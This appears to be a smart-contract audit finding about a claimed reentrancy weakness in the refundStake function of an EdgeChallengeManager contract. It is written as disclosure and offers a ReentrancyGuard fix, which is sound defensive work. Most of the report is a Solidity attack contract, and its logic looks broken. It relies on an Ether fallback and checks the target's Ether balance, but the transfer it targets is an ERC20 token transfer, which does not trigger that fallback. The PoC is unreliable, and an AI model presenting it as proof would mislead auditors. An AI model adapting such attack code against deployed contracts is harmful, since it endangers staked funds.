# Vulnerability details

## Impact
Functions such as refundStake involve transferring tokens (st.safeTransfer) to an external address (edge.staker) without employing reentrancy guards.
This can allow reentrancy attacks where an external contract called within the transfer can re-enter the contract and manipulate state unexpectedly.

## Proof of Concept
- Deploy the Vulnerable Contract: First, deploy the EdgeChallengeManager contract.
- Deploy the Malicious Contract: Deploy the ReentrancyAttack contract with the address of the deployed EdgeChallengeManager, the token address, and a valid edgeId.
- Trigger the Attack: Call the attack function from the ReentrancyAttack contract to initiate the reentrancy attack.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./EdgeChallengeManager.sol";  // Import the vulnerable contract
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttack {
    EdgeChallengeManager public vulnerableContract;
    IERC20 public token;
    bytes32 public edgeId;

    constructor(EdgeChallengeManager _vulnerableContract, IERC20 _token, bytes32 _edgeId) {
        vulnerableContract = _vulnerableContract;
        token = _token;
        edgeId = _edgeId;
    }

    // Fallback function to receive Ether and trigger the reentrancy
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.refundStake(edgeId);
        }
    }

    function attack() external {
        // Assuming the attacker has already staked and edgeId is valid
        vulnerableContract.refundStake(edgeId);
    }

    function withdraw() external {
        // Withdraw stolen funds
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
```

## Recommended Mitigation Steps
Use the OpenZeppelin ReentrancyGuard or the checks-effects-interactions pattern to prevent reentrancy attacks.
```
contract EdgeChallengeManager is IEdgeChallengeManager, Initializable, ReentrancyGuard {
    ...
    function refundStake(bytes32 edgeId) public nonReentrant {
        ...
    }
}
```
